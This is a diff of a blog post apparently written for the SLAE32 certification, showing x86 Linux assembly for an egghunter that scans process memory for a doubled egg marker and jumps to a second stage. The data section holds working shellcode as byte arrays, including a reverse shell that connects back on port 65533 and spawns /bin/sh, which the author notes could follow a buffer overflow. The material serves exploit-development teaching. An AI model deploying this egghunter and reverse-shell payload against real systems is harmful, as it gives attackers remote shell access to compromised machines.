@@ -7,19 +7,23 @@ excerpt: asm code for my egghunter
     ; author      : Sandro "guly" Zaccarini SLAE-1037
     ; purpose     : this code has been written for SLAE32 assignment 3
     ; license     : CC-BY-NC-SA
-    ; description :
-    ; this code will search a string in memory, repeated twice to avoid potential false positives, and when found jumps
-    ; just after it to execute following code.
-    ; because this course is about assembly, i'm trying avoid any C code, therefore also stage2 will be placed in this file in data section.
+    ; description : this code will search a string in memory, repeated twice to avoid
+    ;               potential false positives, and when found jumps just after it to
+    ;               execute following code.
+    ;               because this course is about assembly, i'm trying avoid any C code,
+    ;               therefore also stage2 will be placed in this file in data section.
     ;
-    ; the program starts from address memory 0x08048000 , because i know that .data places values there, and reads 4 bytes to compare to a known egg
-    ; should be noted that a different scenario, where for example i exploited a buffer overflow, i could've places stage2 at stack page and the
-    ; seek would be way longer
+    ; the program starts from address memory 0x08048000 , because i know that .data
+    ; places values there, and reads 4 bytes to compare to a known egg
+    ; note that in a different scenario, where for example i exploited a buffer overflow,
+    ; i could've places stage2 at stack page and the seek would be a bit longer
     ;
-    ; i also know that not all addresses are readable by the program: that's why i'm checking if i can read before to compare.
+    ; i also know that not all addresses are readable by the program: that's why i'm
+    ; checking if i can read before to compare.
     ;
-    ; during the journey i learned about scasd: the op compares edi and eax and is just one byte, when a classic
-    ; cmp is 2. saving 2 bytes in an egghunter could be lifesaver, but i'm using cmp anyway here
+    ; during the journey i learned about scasd: the op compares edi and eax and is just
+    ; 1 byte, when a classic cmp is 2. saving 2 bytes in an egghunter could be lifesaver,
+    ; but i'm using cmp anyway here
     ;
     
     global _start
@@ -47,8 +51,8 @@ excerpt: asm code for my egghunter
     
     ; i'm starting from 0x08048000 because i know where to look. i've started from 0x1000
     ; using dl as 0x1 and not 0x0 to avoid null byte
-    ; actually, i don't needed to zero edx here: i'm moving a full 4bytes. in a real shellcode i probably had to start from 0x1000 as i said
-    ; and that's why i'd need esx to be nulled
+    ; actually i don't needed to zero edx here: i'm mova full 4bytes. in a real shellcode
+    ; i probably had to start from 0x1000 as i said and that's why i'd need edx to be 0x0
     mov edx, 0x08047001
     
     nextp:
@@ -59,8 +63,9 @@ excerpt: asm code for my egghunter
     ; and with this inc i'll be at the top of the memory page, which will be 0x08048000
     inc edx
     
-    ; inc edx will result in an overflow of our 32bit register as soon as we reach 0xfffff000 memory segment
-    ; by checking OF flag, we know that we reached the end of the memory: to avoid DoSsing the box, we call a neat exit
+    ; inc edx will result in an overflow of our 32bit register as soon as we reach
+    ; 0xfffff000 memory segment. by checking OF flag, we know that we reached the end of
+    ; the memory: to avoid DoSsing the box, we call a neat exit
     jo exit
     
     ; check if we can read the memory
@@ -84,7 +89,8 @@ excerpt: asm code for my egghunter
     cmp [edx], esi
     jnz nextb
     
-    ; search again for 2nd copy of the egg (avoid matching code itself or any other false positive)
+    ; search again for 2nd copy of the egg to avoid matching code itself or any other
+    ; false positive
     cmp [edx+4], esi
     jnz nextb
     
@@ -95,10 +101,11 @@ excerpt: asm code for my egghunter
     
     section .data
     ; all shellcode ends with 0x31, 0xC0, 0xB0, 0x01, 0xCD, 0x80 which is my neat exit
-    ; looking for EGG GUGU i'm going to receive a revshell on localhost port 65533 by using the code from 03_revshell_tcp.asm
+    ; looking for EGG GUGU i'm going to receive a revshell on localhost port 65533 by
+    ; using the code from 03_revshell_tcp.asm found in https://github.com/gulyslae/SLAE32
     ;revshell: db 0x47,0x55,0x47,0x55,0x47,0x55,0x47,0x55,0x6a,0x66,0x58,0x6a,0x01,0x5b,0x31,0xc9,0x51,0x53,0x6a,0x02,0x89,0xe1,0xcd,0x80,0x89,0xc7,0xb0,0x66,0x5b,0x68,0x7f,0x01,0x01,0x01,0x66,0x68,0x04,0xd2,0x66,0x53,0x89,0xe1,0x6a,0x10,0x51,0x57,0x89,0xe1,0x43,0xcd,0x80,0x87,0xfb,0x6a,0x02,0x59,0xb0,0x3f,0xcd,0x80,0x49,0xb0,0x3f,0xcd,0x80,0x49,0xb0,0x3f,0xcd,0x80,0x31,0xd2,0x52,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x89,0xd1,0xb0,0x0b,0xcd,0x80
     revshell: db  0x47,0x55,0x47,0x55,0x47,0x55,0x47,0x55,0x31,0xc0,0x31,0xdb,0x50,0x40,0x50,0x40,0x50,0x89,0xe1,0xb0,0x33,0x04,0x33,0x43,0xcd,0x80,0x89,0xc6,0x31,0xc0,0x31,0xdb,0x68,0xac,0x10,0xc9,0xa2,0x68,0x7f,0x01,0x01,0x01,0x66,0x68,0xff,0xfb,0x66,0x6a,0x02,0x89,0xe1,0x6a,0x10,0x51,0x56,0x89,0xe1,0xb3,0x03,0xb0,0x33,0x04,0x33,0xcd,0x80,0x31,0xc9,0xb1,0x03,0x89,0xf3,0x31,0xc0,0xb0,0x3f,0x49,0xcd,0x80,0xb0,0x3f,0x49,0xcd,0x80,0xb0,0x3f,0x49,0xcd,0x80,0x51,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x51,0x89,0xe2,0x51,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0x31,0xc0,0xb0,0x01,0xcd,0x80
     ; looking for EGG LYLY i'm just printing Helo string
     writeHelo: db 0x4c,0x59,0x4c,0x59,0x4c,0x59,0x4c,0x59,0x31,0xc0,0x31,0xdb,0x31,0xd2,0x50,0x68,0x48,0x65,0x6c,0x6c,0xb0,0x04,0xb3,0x01,0x89,0xe1,0xb2,0x04,0xcd,0x80,0x31,0xc0,0x31,0xdb,0xfe,0xc0,0xb3,0x05,0xcd,0x80
     
-    ; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
